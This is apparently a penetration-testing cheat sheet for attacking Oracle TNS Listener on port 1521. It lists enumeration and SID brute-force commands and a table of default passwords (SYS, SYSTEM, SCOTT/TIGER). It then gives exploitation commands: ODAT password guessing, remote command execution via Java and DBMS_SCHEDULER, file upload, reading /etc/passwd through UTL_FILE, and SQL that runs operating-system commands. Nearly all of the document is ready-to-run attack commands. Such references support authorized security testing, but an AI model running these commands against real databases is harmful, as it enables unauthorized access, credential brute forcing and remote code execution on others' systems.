# Port 1521 - Oracle TNS Listener

## Table of Contents
- [Enumeration](#enumeration)
- [SID Enumeration](#sid-enumeration)
- [Authentication](#authentication)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap all Oracle scripts
nmap -p 1521 --script "oracle-*" $rhost

# TNS version + status
tnscmd10g version -h $rhost && tnscmd10g status -h $rhost
```

### ODAT All-in-One (One-liner)

```shell
# Full Oracle enumeration
odat all -s $rhost -p 1521 2>/dev/null | tee oracle_enum.txt
```

---

## SID Enumeration

### Using tnscmd10g

```shell
# Version
tnscmd10g version -h $rhost

# Status
tnscmd10g status -h $rhost

# Ping
tnscmd10g ping -h $rhost
```

### Using ODAT

```shell
# Install ODAT
pip3 install odat

# SID guessing
odat sidguesser -s $rhost -p 1521

# All checks
odat all -s $rhost -p 1521
```

### Using oscanner

```shell
oscanner -s $rhost -P 1521
```

### Using Metasploit

```shell
# SID enumeration
use auxiliary/admin/oracle/sid_brute
set RHOSTS $rhost
run

# TNS listener version
use auxiliary/scanner/oracle/tnsversion
set RHOSTS $rhost
run
```

### Common SIDs

```
ORCL
XE
ORCLCDB
PLSExtProc
CLRExtProc
```

---

## Authentication

### Default Credentials

| Username | Password | Description |
| :--- | :--- | :--- |
| SYS | CHANGE_ON_INSTALL | Default SYS |
| SYSTEM | MANAGER | Default SYSTEM |
| SCOTT | TIGER | Sample user |
| DBSNMP | DBSNMP | SNMP agent |
| OUTLN | OUTLN | Outlines |

### SQLPlus Connection

```shell
# Basic connection
sqlplus $user/$password@$rhost:1521/$sid

# As SYSDBA
sqlplus $user/$password@$rhost:1521/$sid as sysdba

# Example
sqlplus SCOTT/TIGER@$rhost:1521/XE
```

### Brute Force with ODAT

```shell
# Password guessing
odat passwordguesser -s $rhost -p 1521 -d $sid
```

---

## Exploitation

### Remote Code Execution via ODAT

```shell
# Check all attack vectors
odat all -s $rhost -p 1521 -d $sid -U $user -P $password

# Execute commands via Java
odat java -s $rhost -p 1521 -d $sid -U $user -P $password --exec "whoami"

# Execute commands via dbmsscheduler
odat dbmsscheduler -s $rhost -p 1521 -d $sid -U $user -P $password --exec "C:\windows\system32\cmd.exe /c whoami"

# Upload file
odat utlfile -s $rhost -p 1521 -d $sid -U $user -P $password --putFile /tmp shell.txt shell.txt

# Read file
odat utlfile -s $rhost -p 1521 -d $sid -U $user -P $password --getFile /etc passwd.txt passwd
```

### SQLPlus Commands

```sql
-- Get version
SELECT * FROM V$VERSION;

-- Current user
SELECT USER FROM DUAL;

-- List users
SELECT USERNAME FROM ALL_USERS;

-- List tables
SELECT TABLE_NAME FROM ALL_TABLES;

-- Read file (DBA required)
SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1) FROM DUAL;

-- Execute OS command (DBA required)
EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'myjob',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,auto_drop=>FALSE);
```

### Privilege Escalation

```sql
-- Check current privileges
SELECT * FROM USER_SYS_PRIVS;
SELECT * FROM USER_ROLE_PRIVS;

-- Check DBA role
SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTEE='PUBLIC';
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| tnscmd10g | `tnscmd10g version -h $rhost` | Get TNS version |
| ODAT | `odat sidguesser -s $rhost` | Enumerate SIDs |
| ODAT | `odat all -s $rhost -d $sid -U user -P pass` | All checks |
| sqlplus | `sqlplus user/pass@$rhost:1521/SID` | Connect to DB |
| Nmap | `nmap -p 1521 --script "oracle-sid-brute" $rhost` | SID brute force |
